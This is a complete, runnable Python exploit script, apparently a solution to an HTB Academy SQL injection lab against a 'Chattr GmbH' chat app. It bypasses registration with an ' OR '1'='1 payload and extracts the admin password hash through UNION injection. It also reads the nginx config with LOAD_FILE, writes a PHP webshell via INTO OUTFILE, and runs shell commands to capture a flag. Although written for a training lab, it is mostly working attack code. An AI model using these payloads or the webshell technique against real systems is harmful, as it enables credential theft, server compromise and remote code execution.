#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║  CHATTR GMBH - SQL INJECTION EXPLOIT                                          ║
║  HTB Academy Skills Assessment                                                ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
import http.client
import ssl
import urllib.parse
import re
import sys
import time
import os
import threading
from typing import Optional, Dict
from dataclasses import dataclass

DELAY = 0.4
ANIMATION_SPEED = 0.08
VERBOSE = False

class Term:
    """ANSI escape sequence controller"""
    RESET, BOLD, DIM = "\033[0m", "\033[1m", "\033[2m"
    RED, GREEN, YELLOW = "\033[38;5;196m", "\033[38;5;46m", "\033[38;5;226m"
    CYAN, ORANGE, GRAY, WHITE = "\033[38;5;51m", "\033[38;5;208m", "\033[38;5;245m", "\033[38;5;255m"
    MAGENTA = "\033[38;5;135m"
    CLEAR_LINE = "\033[2K\r"
    HIDE_CURSOR = "\033[?25l"
    SHOW_CURSOR = "\033[?25h"
class Spinner:
    """Animated loading spinner"""
    FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    def __init__(self, message: str):
        self.message = message
        self.running = False
        self.thread = None
    def _animate(self):
        i = 0
        while self.running:
            frame = self.FRAMES[i % len(self.FRAMES)]
            print(f"{Term.CLEAR_LINE}{Term.CYAN}  ├─{frame}{Term.RESET} {self.message}", end="", flush=True)
            time.sleep(ANIMATION_SPEED)
            i += 1
    def start(self):
        self.running = True
        print(Term.HIDE_CURSOR, end="")
        self.thread = threading.Thread(target=self._animate, daemon=True)
        self.thread.start()
    def stop(self, success_msg: str = None):
        self.running = False
        if self.thread:
            self.thread.join(timeout=0.2)
        print(Term.CLEAR_LINE, end="")
        print(Term.SHOW_CURSOR, end="")
        if success_msg:
            print(f"{Term.CYAN}  ├─▶{Term.RESET} {success_msg}")
class UI:
    """Terminal UI renderer"""
    @staticmethod
    def banner():
        print(Term.HIDE_CURSOR, end="")
        lines = [
            f"{Term.RED}╔{'═'*68}╗{Term.RESET}",
            f"{Term.RED}║{Term.ORANGE}{Term.BOLD}  ◢◤ CHATTR GMBH ◢◤ SQL INJECTION EXPLOIT ◢◤{Term.RESET}{Term.RED}{' '*22}  ║{Term.RESET}",
            f"{Term.RED}║{Term.GRAY}  HTB Academy - SQL Injection Fundamentals{Term.RED}{' '*25} ║{Term.RESET}",
            f"{Term.RED}╚{'═'*68}╝{Term.RESET}",
        ]
        print()
        for line in lines:
            print(line)
            time.sleep(0.1)
        print()
        print(Term.SHOW_CURSOR, end="")
    @staticmethod
    def section(title: str):
        time.sleep(DELAY)
        print(f"\n{Term.YELLOW}┌─ {title} {'─' * (63 - len(title))}┐{Term.RESET}")
        time.sleep(0.2)
    @staticmethod
    def step(msg: str):
        time.sleep(DELAY / 2)
        print(f"{Term.CYAN}  ├─▶{Term.RESET} {msg}")
    @staticmethod
    def substep(msg: str):
        time.sleep(DELAY / 3)
        print(f"{Term.GRAY}  │   └─ {msg}{Term.RESET}")
    @staticmethod
    def payload(sql: str):
        time.sleep(DELAY / 2)
        h = sql
        for kw in ["UNION", "SELECT", "FROM", "WHERE", "LOAD_FILE", "INTO", "OUTFILE", "OR"]:
            h = h.replace(kw, f"{Term.ORANGE}{kw}{Term.GRAY}")
        print(f"{Term.GRAY}  │   ┌─ {Term.DIM}SQL:{Term.RESET} {Term.GRAY}{h}{Term.RESET}")
    @staticmethod
    def success(label: str, value: str):
        time.sleep(DELAY / 2)
        print(f"{Term.GREEN}  └─✓ {label}:{Term.RESET} {Term.WHITE}{Term.BOLD}{value}{Term.RESET}")
    @staticmethod
    def result(q: int, label: str, value: str):
        time.sleep(0.3)
        print(f"  {Term.CYAN}Q{q}{Term.RESET} │ {Term.GRAY}{label}:{Term.RESET} {Term.GREEN}{value}{Term.RESET}")
    @staticmethod
    def divider():
        print(f"{Term.RED}{'═' * 70}{Term.RESET}")
@dataclass
class Response:
    """HTTP response container"""
    status: int
    headers: Dict[str, str]
    body: bytes
    @property
    def text(self) -> str:
        return self.body.decode('utf-8', errors='replace')
    @property
    def location(self) -> Optional[str]:
        return self.headers.get('location')
class HTTP:
    """Raw HTTPS client with cookie persistence"""
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.cookies: Dict[str, str] = {}
        self._ctx = ssl.create_default_context()
        self._ctx.check_hostname = False
        self._ctx.verify_mode = ssl.CERT_NONE
        self._conn: Optional[http.client.HTTPSConnection] = None
    def _connect(self) -> http.client.HTTPSConnection:
        if self._conn is None:
            self._conn = http.client.HTTPSConnection(self.host, self.port, context=self._ctx, timeout=10)
        return self._conn
    def _headers(self) -> Dict[str, str]:
        h = {
            "Host": f"{self.host}:{self.port}",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0",
            "Accept": "*/*",
            "Connection": "keep-alive",
        }
        if self.cookies:
            h["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
        return h
    def _parse_cookies(self, resp: http.client.HTTPResponse):
        for k, v in resp.getheaders():
            if k.lower() == "set-cookie":
                part = v.split(";")[0]
                if "=" in part:
                    name, val = part.split("=", 1)
                    self.cookies[name.strip()] = val.strip()
    def _debug_request(self, method: str, path: str, headers: Dict[str, str], body: bytes = None):
        """Print raw HTTP request for debugging"""
        print(f"\n{Term.MAGENTA}{'─'*70}{Term.RESET}")
        print(f"{Term.MAGENTA}▶ REQUEST{Term.RESET}")
        print(f"{Term.MAGENTA}{'─'*70}{Term.RESET}")
        print(f"{Term.WHITE}{method} {path} HTTP/1.1{Term.RESET}")
        for k, v in headers.items():
            print(f"{Term.GRAY}{k}: {v}{Term.RESET}")
        if body:
            decoded = body.decode('utf-8', errors='replace')
            if len(decoded) > 200:
                decoded = decoded[:200] + f"... ({len(body)} bytes)"
            print(f"\n{Term.DIM}{decoded}{Term.RESET}")
    def _debug_response(self, status: int, headers: Dict[str, str], body: bytes):
        """Print raw HTTP response for debugging"""
        print(f"\n{Term.MAGENTA}◀ RESPONSE{Term.RESET}")
        print(f"{Term.MAGENTA}{'─'*70}{Term.RESET}")
        print(f"{Term.WHITE}HTTP/1.1 {status}{Term.RESET}")
        for k, v in headers.items():
            print(f"{Term.GRAY}{k}: {v}{Term.RESET}")
        decoded = body.decode('utf-8', errors='replace')
        if len(decoded) > 500:
            decoded = decoded[:500] + f"\n... ({len(body)} bytes total)"
        print(f"\n{Term.DIM}{decoded}{Term.RESET}")
        print(f"{Term.MAGENTA}{'─'*70}{Term.RESET}\n")
    def request(self, method: str, path: str, body: str = None) -> Response:
        conn = self._connect()
        headers = self._headers()
        encoded = None
        if body:
            encoded = body.encode('utf-8')
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["Content-Length"] = str(len(encoded))
        if VERBOSE:
            self._debug_request(method, path, headers, encoded)
        try:
            conn.request(method, path, body=encoded, headers=headers)
            resp = conn.getresponse()
            self._parse_cookies(resp)
            resp_headers = {k.lower(): v for k, v in resp.getheaders()}
            resp_body = resp.read()
            if VERBOSE:
                self._debug_response(resp.status, resp_headers, resp_body)
            return Response(
                status=resp.status,
                headers=resp_headers,
                body=resp_body
            )
        except Exception:
            self._conn = None
            raise
    def get(self, path: str, params: Dict[str, str] = None) -> Response:
        if params:
            path = f"{path}?{urllib.parse.urlencode(params)}"
        return self.request("GET", path)
    def post(self, path: str, data: Dict[str, str]) -> Response:
        return self.request("POST", path, urllib.parse.urlencode(data))
class SQLi:
    """SQL injection engine"""
    SHELL = b'<?php system($_GET["cmd"]); ?>'
    CLOSURE = "')"
    def __init__(self, client: HTTP):
        self.client = client
        self.user: Optional[str] = None
    def _union(self, payload: str) -> str:
        return f"{self.CLOSURE} UNION SELECT 1,2,{payload},4-- -"
    def _extract(self, html: str) -> Optional[str]:
        m = re.findall(r'<span class="badge[^"]*">([^<]+)</span>', html)
        return m[0] if m else None
    def auth(self) -> bool:
        spinner = Spinner("Generating session credentials...")
        spinner.start()
        time.sleep(0.8)
        self.user = f"exploit_{int(time.time())}"
        pw = "Exploit123!"
        spinner.stop(f"Generated credentials for {Term.WHITE}{self.user}{Term.RESET}")
        UI.substep(f"Password: {'*' * len(pw)}")
        spinner = Spinner("Bypassing invitation code validation...")
        spinner.start()
        sqli = "' OR '1'='1"
        self.client.post("/api/register.php", {
            "username": self.user, "password": pw,
            "repeatPassword": pw, "invitationCode": sqli
        })
        time.sleep(0.6)
        spinner.stop("Invitation code bypassed")
        UI.payload(sqli)
        spinner = Spinner("Establishing authenticated session...")
        spinner.start()
        self.client.post("/api/login.php", {"username": self.user, "password": pw})
        time.sleep(0.5)
        sid = self.client.cookies.get("PHPSESSID")
        if sid:
            spinner.stop("Session established")
            UI.substep(f"Session ID: {sid[:20]}...")
            return True
        spinner.stop("Failed to establish session")
        return False
    def inject(self, payload: str, msg: str = "") -> Optional[str]:
        union = self._union(payload)
        if msg:
            spinner = Spinner(msg)
            spinner.start()
            time.sleep(0.7)
            resp = self.client.get("/index.php", {"u": "1", "q": union})
            spinner.stop(msg.replace("...", ""))
        else:
            resp = self.client.get("/index.php", {"u": "1", "q": union})
        UI.payload(union)
        return self._extract(resp.text)
    def get_hash(self) -> Optional[str]:
        result = self.inject(
            "(SELECT password FROM Users WHERE username='admin')",
            "Extracting password hash from Users table..."
        )
        if result:
            UI.substep("Hash algorithm: Argon2i (memory-hard)")
        return result
    def get_root(self) -> Optional[str]:
        result = self.inject(
            "LOAD_FILE('/etc/nginx/sites-enabled/default')",
            "Reading nginx configuration via LOAD_FILE()..."
        )
        if result:
            m = re.search(r'root\s+([^;]+)', result)
            if m:
                UI.substep("Parsed root directive from nginx config")
                return m.group(1).strip()
        return None
    def deploy_shell(self, root: str) -> bool:
        path = f"{root}/shell.php"
        spinner = Spinner(f"Writing webshell to {path}...")
        spinner.start()
        payload = f"0x{self.SHELL.hex()},4 INTO OUTFILE '{path}'-- -"
        full = f"{self.CLOSURE} UNION SELECT 1,2,{payload}"
        self.client.get("/index.php", {"u": "1", "q": full})
        time.sleep(0.8)
        spinner.stop(f"Webshell deployed to {path}")
        UI.substep(f"Payload: {len(self.SHELL)} bytes PHP backdoor")
        UI.payload(full)
        return True
    def exec(self, cmd: str) -> str:
        resp = self.client.get("/shell.php", {"cmd": cmd})
        return re.sub(r'1\t2\t|\t4', '', resp.text).strip()
    def get_flag(self) -> Optional[str]:
        spinner = Spinner("Executing reconnaissance (ls /)...")
        spinner.start()
        time.sleep(0.6)
        files = self.exec("ls /").split()
        spinner.stop("Directory listing complete")
        flag_file = next((f for f in files if f.startswith("flag_") and f.endswith(".txt")), None)
        if flag_file:
            UI.substep(f"Target identified: /{flag_file}")
            spinner = Spinner(f"Reading flag contents...")
            spinner.start()
            time.sleep(0.5)
            content = self.exec(f"cat /{flag_file}")
            spinner.stop("Flag captured!")
            UI.substep(f"Command: cat /{flag_file}")
            return content
        return None
@dataclass
class Results:
    """Exploit results"""
    hash: Optional[str] = None
    root: Optional[str] = None
    flag: Optional[str] = None
def exploit(target: str) -> Results:
    """Main exploitation flow"""
    host, port = (target.split(":") + ["443"])[:2]
    port = int(port)
    results = Results()
    UI.banner()
    UI.section("PHASE 1: Connection & Authentication")
    spinner = Spinner(f"Establishing TLS connection to {host}:{port}...")
    spinner.start()
    client = HTTP(host, port)
    time.sleep(0.6)
    spinner.stop(f"Connected to {host}:{port} via TLS")
    engine = SQLi(client)
    if not engine.auth():
        UI.step("Authentication failed!")
        return results
    UI.success("Session", "Authenticated successfully")
    UI.section("PHASE 2: Data Extraction")
    results.hash = engine.get_hash()
    if results.hash:
        UI.success("Admin Hash", results.hash[:50] + "...")
    results.root = engine.get_root()
    if results.root:
        UI.success("Web Root", results.root)
    UI.section("PHASE 3: Remote Code Execution")
    if results.root:
        engine.deploy_shell(results.root)
        UI.section("PHASE 4: Flag Capture")
        results.flag = engine.get_flag()
        if results.flag:
            UI.success("Flag", results.flag)
    print()
    time.sleep(0.5)
    UI.divider()
    print(f"{Term.BOLD}{Term.WHITE}{'RESULTS':^70}{Term.RESET}")
    UI.divider()
    UI.result(1, "Admin Password Hash", results.hash or "Not found")
    UI.result(2, "Web Application Root", results.root or "Not found")
    UI.result(3, "Flag", results.flag or "Not found")
    UI.divider()
    print()
    return results
def main():
    global VERBOSE
    args = [a for a in sys.argv[1:] if not a.startswith('-')]
    flags = [a for a in sys.argv[1:] if a.startswith('-')]
    if '-v' in flags or '--verbose' in flags:
        VERBOSE = True
    target = args[0] if args else os.getenv("TARGET")
    if not target:
        print(f"""
{Term.RED}╔{'═'*58}╗
║{Term.WHITE}{Term.BOLD}{'CHATTR SQLI EXPLOIT':^58}{Term.RED}║
╠{'═'*58}╣{Term.RESET}
{Term.GRAY}║  Usage: python3 {sys.argv[0]:<40} ║
║         TARGET=<ip:port> python3 {sys.argv[0]:<23} ║
║                                                          ║
║  Flags:                                                  ║
║    -v, --verbose    Show raw HTTP request/response       ║{Term.RED}
╚{'═'*58}╝{Term.RESET}
""")
        sys.exit(1)
    try:
        exploit(target)
    except KeyboardInterrupt:
        print(Term.SHOW_CURSOR, end="")
        print(f"\n{Term.YELLOW}[!] Interrupted{Term.RESET}")
        sys.exit(130)
    except Exception as e:
        print(Term.SHOW_CURSOR, end="")
        print(f"\n{Term.RED}[!] Error: {e}{Term.RESET}")
        sys.exit(1)
if __name__ == "__main__":
    main()
